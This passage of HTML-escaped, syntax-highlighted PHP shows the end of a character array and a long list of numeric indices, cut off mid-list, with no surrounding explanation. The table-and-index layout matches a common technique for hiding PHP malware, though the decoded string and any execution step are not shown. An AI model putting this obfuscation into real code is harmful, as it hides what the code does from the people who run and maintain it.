&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;amp;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\&amp;#39;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;!&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;G&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;~&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;O&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;h&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;u&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;U&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;@&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;H&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;F&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;6&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;L&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;^&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;,&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;l&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;$&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;`&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;N&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;}&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;J&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;5&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;=&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;k&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;o&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;7&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;#&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;i&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;I&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Y&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;j&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;?&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;K&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;B&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;t&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;R&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;4&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;8&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;|&amp;#34;&lt;/span&gt;);
	$order&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span 